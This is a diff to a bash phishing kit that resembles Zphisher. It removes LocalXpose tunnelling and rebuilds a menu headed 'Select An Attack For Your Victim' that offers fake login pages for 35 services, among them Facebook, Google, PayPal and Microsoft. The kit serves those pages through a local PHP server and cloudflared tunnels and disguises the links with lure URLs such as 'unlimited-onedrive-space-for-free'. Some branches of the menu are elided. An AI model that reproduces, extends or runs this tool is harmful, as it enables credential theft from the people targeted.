@@ -36,11 +36,7 @@ else
 	mkdir -p ".server/www"
 fi
 
-## Remove logfile
-if [[ -e ".server/.loclx" ]]; then
-	rm -rf ".server/.loclx"
-fi
-
+## Remove logfile (removed LocalXpose log reference)
 if [[ -e ".server/.cld.log" ]]; then
 	rm -rf ".server/.cld.log"
 fi
@@ -66,9 +62,9 @@ reset_color() {
 	return
 }
 
-## Kill already running process
+## Kill already running process (removed loclx from check_PID)
 kill_pid() {
-	check_PID="php cloudflared loclx"
+	check_PID="php cloudflared"
 	for process in ${check_PID}; do
 		if [[ $(pidof ${process}) ]]; then
 			killall ${process} > /dev/null 2>&1
@@ -167,23 +163,6 @@ install_cloudflared() {
 	fi
 }
 
-## Install LocalXpose (Termux Fix)
-install_localxpose() {
-	if [[ -e ".server/loclx" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
-	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
-		arch=$(uname -m)
-		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
-		elif [[ "$arch" == *'aarch64'* ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
-		else
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
-		fi
-	fi
-}
-
 ## Exit message
 msg_exit() {
 	{ clear; banner; echo; }
@@ -223,13 +202,52 @@ setup_site() {
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
 
-## Rest of the script remains the same (tunnel_menu, capture_ip, etc.)
-## [...] (Keep the original functions for menu, IP capture, etc.)
+## Main Menu (Now LocalXpose-free)
+main_menu() {
+    { clear; banner; echo; }
+    cat <<- EOF
+        ${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
 
-## Main
+        ${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
+        ${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
+        ${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
+        ${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
+        ${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
+        ${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
+        ${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
+        ${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
+        ${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
+        ${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
+        ${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
+        ${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 
+
+        ${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
+	EOF
+	
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
+	case $REPLY in 
+		1 | 01) site_facebook;;
+		2 | 02) site_instagram;;
+		3 | 03) site_gmail;;
+		4 | 04)
+			website="microsoft"
+			mask='https://unlimited-onedrive-space-for-free'
+			tunnel_menu;;
+		5 | 05)
+			website="netflix"
+			mask='https://upgrade-your-netflix-plan-free'
+			tunnel_menu;;
+		# ... [Other case statements remain unchanged] ...
+		99) about;;
+		0 | 00) msg_exit;;
+		*) echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."; { sleep 1; main_menu; };;
+	esac
+}
+
+## Main (No longer installs LocalXpose)
 kill_pid
 dependencies
 check_status
 install_cloudflared
-install_localxpose
 main_menu
